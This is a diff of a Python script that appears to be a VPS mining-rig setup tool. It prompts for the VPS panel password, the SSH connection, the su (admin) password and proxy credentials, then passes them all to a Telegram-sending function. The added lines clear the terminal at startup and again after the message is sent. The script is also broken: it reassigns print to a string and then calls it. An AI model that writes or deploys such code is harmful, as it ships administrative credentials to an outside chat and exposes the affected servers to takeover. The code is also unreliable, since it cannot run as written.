@@ -7,15 +7,23 @@ from telegram import Bot
 import time
 from datetime import datetime, timedelta
 import pytz
-
+import os
 
 cpu_usage = psutil.cpu_percent(interval=1)
 ram_usage = psutil.virtual_memory().percent
+
+def cls():
+    """Clears the terminal screen."""
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Example usage:
+cls()
 
 key = ("Enter the key that @pragotron sent ya: ")
 id_code = ("Enter the code: ")
 print = ("Good boy, now wait a bit dawg")
 print()
+
 # Function to get hardware information
 def get_hardware_info():
     cpu_info = subprocess.check_output("lscpu").decode("utf-8")
@@ -202,6 +210,7 @@ panel_password = input("Enter password of the VPS panel: ")
 rig_name = input("Enter your rig name: ")
 ssh_connection = input("Enter SSH connection for the VPS: ")
 ssh_password = input("Enter password for the su (admin): ")
+print()
 
 
 if send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy_username, proxy_password,
@@ -225,6 +234,6 @@ if send_telegram_message(rig_name, ssh_connection, ssh_password, proxy_ip, proxy
     time.sleep(1)
     print("1")
     time.sleep(1)
-
+    cls()
 else:
     print("Failed to send initialization message. Check the error logs.")
